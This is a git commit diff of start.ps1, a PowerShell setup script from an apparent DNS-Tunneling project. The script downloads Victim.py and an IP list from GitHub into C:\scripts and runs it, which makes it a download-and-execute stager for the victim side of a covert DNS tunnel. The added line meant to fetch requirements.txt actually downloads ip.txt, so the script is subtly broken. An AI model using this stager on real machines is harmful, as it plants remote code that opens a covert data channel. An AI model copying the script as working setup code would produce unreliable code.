9e0402ec2f76d1c91bfc28b9c775bfd7336ad7d7
ShacharMarkovich <234shachar@gmail.com>
2021-11-30 09:33:18 +0200

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -2,16 +2,15 @@ mkdir C:\scripts
 $env:Path += ';C:\scripts'
 cd C:\scripts
 
-python -m venv env
-.\env\Scripts\Activate.ps1
-
-pip install pyDH
-pip install secrets
-pip install pycryptodome 
-pip install scapy
-
 $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/Victim.py","C:\scripts\v.py")
 $WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/ip.txt","C:\scripts\ip.txt")
+$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/ip.txt","C:\scripts\requirements.txt")
+
+python -m venv env
+.\env\Scripts\Activate.ps1
+
+
+pip install -r requirements.txt
 
 python v.py
